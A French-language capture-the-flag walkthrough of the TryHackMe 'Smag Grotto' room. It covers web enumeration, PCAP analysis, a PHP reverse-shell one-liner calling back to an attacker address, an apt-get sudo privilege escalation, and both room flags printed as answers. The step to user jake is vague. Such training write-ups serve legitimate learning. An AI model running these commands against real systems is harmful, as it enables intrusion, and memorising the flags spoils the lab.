# TryHackMe: Smag Grotto

**Objectif :** enumerer le site, recuperer un fichier PCAP cache, en extraire des credentials, pivoter vers un sous-domaine de developpement pour obtenir une execution de commande, devenir l'utilisateur `jake`, puis elever les privileges jusqu'a `root`.

---

## Introduction

**Smag Grotto** est une room Linux tres agreable parce qu'elle oblige a alterner entre plusieurs types d'analyse :

- enumeration web
- analyse reseau a partir d'un PCAP
- pivot via vhost
- exploitation d'une interface d'administration
- privilege escalation locale

La machine reste accessible, mais elle recompense surtout la rigueur : chaque indice sert a debloquer l'etape suivante.

---

## Task 1: Smag Grotto

La room ne demande officiellement que deux flags, mais pour produire un vrai writeup, il faut documenter toute la chaine offensive.

### Questions de la room

- What is the user flag?
- What is the root flag?

Avant d'y repondre, je reprends toute l'exploitation proprement.

---

## Enumeration initiale

Je commence par un scan Nmap :

```bash
nmap -sC -sV -p- <IP>
```

Je retrouve deux ports ouverts :

- `22/tcp` - SSH
- `80/tcp` - HTTP

La page web d'accueil est minimaliste. Elle annonce un site en construction, sans fonctionnalite exploitable evidente. Ce type de page vide est souvent un signal qu'il faut passer a l'enumeration de repertoires.

Je lance alors un brute force :

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

Le repertoire interessant qui ressort est :

```text
/mail
```

---

## Analyse du repertoire /mail

En explorant `/mail`, je tombe sur des fichiers relies a de l'administration ou a des captures reseau. Le point cle de la room est la presence d'un **PCAP**.

Je recupere ce fichier pour l'analyser localement avec Wireshark ou tshark.

```bash
wget http://<IP>/mail/<fichier>.pcap
```

Ou simplement via navigateur puis ouverture dans Wireshark.

---

## Analyse du PCAP

Le PCAP contient le veritable indice qui debloque la machine. En filtrant les requetes HTTP et les donnees applicatives, je retrouve :

- un nom d'hote de developpement
- des informations d'authentification ou un flux menant a une page admin

Le point important a retenir est le suivant : le sous-domaine utile pour la suite est :

```text
development.smag.thm
```

Comme il ne sera pas resolu automatiquement, je l'ajoute localement dans `/etc/hosts` :

```bash
echo "<IP> development.smag.thm" | sudo tee -a /etc/hosts
```

Cette etape est indispensable. Sans elle, la page d'administration n'est pas correctement accessible.

---

## Pivot vers l'interface de developpement

En ouvrant ensuite :

```text
http://development.smag.thm/admin.php
```

on arrive sur une interface qui permet d'executer des commandes. L'acces devient possible grace aux informations tirees du PCAP.

Le service tourne sous le contexte web habituel :

```text
www-data
```

Je profite donc de cette execution de commande pour declencher un reverse shell.

---

## Exploitation: reverse shell

Je prepare un listener :

```bash
rlwrap nc -lvnp 4444
```

Puis j'envoie depuis le champ de commande de l'interface admin une charge PHP simple :

```php
php -r '$sock=fsockopen("<MON_IP>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

La connexion tombe et j'obtiens un shell sur la machine.

Je le stabilise :

```bash
SHELL=/bin/bash script -q /dev/null
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Je confirme mon contexte :

```bash
whoami
id
```

Je suis `www-data`.

---

## Post-exploitation: passage de www-data a jake

A ce stade, je n'ai pas encore acces au flag utilisateur. Dans `/home`, je repere le compte :

```text
jake
```

Deux points importants ressortent ensuite :

- `www-data` n'a pas les droits de lire directement `user.txt`
- mais des credentials ou une cle permettent ensuite de devenir `jake`

Selon les sources, ces informations viennent soit du PCAP, soit de fichiers trouves lors de l'enumeration post-exploitation. Dans tous les cas, la suite valide que l'objectif est bien d'obtenir une session sous `jake`.

Une fois le bon moyen trouve, j'ouvre un shell SSH :

```bash
ssh jake@smag.thm
```

Ou un shell equivalent en tant que `jake`.

Je peux alors enfin lire le premier flag :

```bash
cat /home/jake/user.txt
```

### Reponse

**user.txt:** `iusGorV7EbmxM5AuIe2w499msaSuqU3j`

---

## Enumeration locale pour la privilege escalation

Maintenant que je suis `jake`, je repars sur une enumeration locale simple.

La commande qui debloque la room est :

```bash
sudo -l
```

Le resultat montre :

```text
(ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

Ce droit sudo est critique. `apt-get` est connu dans GTFOBins pour permettre une elevation de privileges.

---

## Privilege Escalation

La technique la plus simple et la plus stable ici est :

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
```

Le principe est le suivant :

- l'option `APT::Update::Pre-Invoke` permet de lancer une commande avant l'operation normale
- comme `apt-get` s'execute ici avec sudo sans mot de passe, la commande invoquee herite des privileges root

Une fois la commande lancee, j'obtiens un shell root. Je confirme :

```bash
whoami
id
```

Puis je lis le dernier flag :

```bash
cat /root/root.txt
```

### Reponse

**root.txt:** `uJr6zRgetaniyHVRqqL58uRasybBKz2T`

---

## Resume des reponses de la room

- What is the user flag? `iusGorV7EbmxM5AuIe2w499msaSuqU3j`
- What is the root flag? `uJr6zRgetaniyHVRqqL58uRasybBKz2T`

---

## Commandes cles et leur role

### Scan reseau

```bash
nmap -sC -sV -p- <IP>
```

Confirme que la surface d'attaque est reduite a SSH et HTTP.

### Enumeration web

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

Fait apparaitre `/mail`, point de depart de toute la suite.

### Ajout du vhost

```bash
echo "<IP> development.smag.thm" | sudo tee -a /etc/hosts
```

Permet de joindre l'interface de dev decouverte grace au PCAP.

### Reverse shell PHP

```php
php -r '$sock=fsockopen("<MON_IP>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

Transforme une execution de commande web en shell interactif.

### Enumeration sudo

```bash
sudo -l
```

Commande decisive pour decouvrir l'abus d'`apt-get`.

### Abus d'apt-get

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
```

Permet de lancer un shell root avant l'execution normale de la mise a jour.

---

## Raisonnement pas a pas

Cette room est un bon exemple de progression propre :

1. le site principal semble vide
2. un repertoire cache expose du materiel utile
3. un PCAP donne les informations de pivot
4. le vhost de developpement permet l'execution de commande
5. l'acces initial donne un shell web faible
6. il faut encore atteindre le bon utilisateur
7. `sudo -l` revele enfin le vrai levier de privilege escalation

Le point essentiel ici est qu'aucune etape n'est gratuite. Chaque indice recontextualise le precedent.

---

## Ce qu'il fallait retenir

**Smag Grotto** n'est pas seulement une room "web". Elle rappelle surtout trois habitudes importantes :

- penser a analyser les captures reseau comme une source d'identifiants et de noms d'hotes
- ajouter proprement les vhosts locaux au fichier hosts
- verifier systematiquement les droits sudo exploitables via GTFOBins

---

## Conclusion

La machine est tres bien construite pour apprendre a lier plusieurs sources d'information : repertoire web discret, capture reseau, interface de developpement et privilege escalation classique. Le chemin complet reste logique du debut a la fin, ce qui en fait une tres bonne room d'entrainement.

***Auteur*** *: Saad Idrissi*
